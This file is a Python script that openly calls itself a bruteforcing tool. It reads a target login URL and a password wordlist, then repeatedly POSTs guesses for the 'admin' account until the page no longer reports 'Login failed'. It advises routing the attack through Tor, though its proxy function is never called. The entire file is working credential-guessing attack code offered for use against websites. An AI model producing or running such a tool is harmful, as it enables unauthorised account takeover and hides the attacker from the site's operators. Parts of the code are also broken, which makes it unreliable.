#!/usr/bin/python

import requests
from pip._vendor.distlib.compat import raw_input

print("[+]...This is a bruteforcing tool")
print("[+]..first install tor and configure it before starting the attack")

#setting the proxy to use with tor
def setupTOR(self):
    self.proxies = {'http':'socks5://localhost:9050','https':'socks5://localhost:9050'}


target_url = raw_input("enter the target website for bruteforcing: ")

#variable for storing the username 

#usernamelist = raw_input("enter the username for which you have to bruteforce: ")


#variable for storing the passwords
password_list = raw_input("enter the path of the password list: ")


#data dict for taking the values for the input function specifying for each parameter

data_dict = {"username": "admin", "password": "", "Login": "submit"}


#sending the post requests to the target website

#showing the html code for the target page

with open(password_list, "r") as wordlist:
    for line in wordlist:
        word = line.strip()
        data_dict["password"] = word
        response = requests.post(target_url, data= data_dict)
        if "Login failed" not in response.content:
            print("[+] Got the password -->" + word)
            exit()


print("[+] Reached end of line")


